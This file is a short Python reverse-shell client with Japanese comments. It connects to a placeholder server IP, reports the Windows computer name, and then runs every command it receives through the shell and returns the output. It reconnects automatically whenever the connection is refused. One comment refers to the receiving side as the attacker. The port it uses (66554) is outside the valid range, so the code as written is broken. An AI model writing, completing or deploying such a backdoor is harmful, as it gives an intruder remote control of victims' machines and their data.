import socket,time,subprocess,timeout_decorator
IP = 'input server ip addr'

#コマンド実行処理
def command_execute(command):
    try:
        result = subprocess.check_output(command, shell=True)
        print(result.decode('shift-jis'))
        return result
    except:
        #存在しないコマンド等であればerrorを返す。
        return b'error=1'
while True:
    try:
        #Socket生成
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP, 66554))
            data = subprocess.check_output('echo %computername%', shell=True)
            s.sendall(data)
            while True:
                data = s.recv(1024)
                try:
                    #コマンドを実行し、その結果を返す
                    result = command_execute(data.decode('utf-8'))
                    if not result:
                        #実行結果が無の場合はexecutedを加害者に送信
                        s.sendall(b'executed')
                    s.sendall(result)
                except:
                    #なんか変なエラー起きたとき
                    s.sendall(b'error=0')
    except ConnectionRefusedError:
        continue
            
  

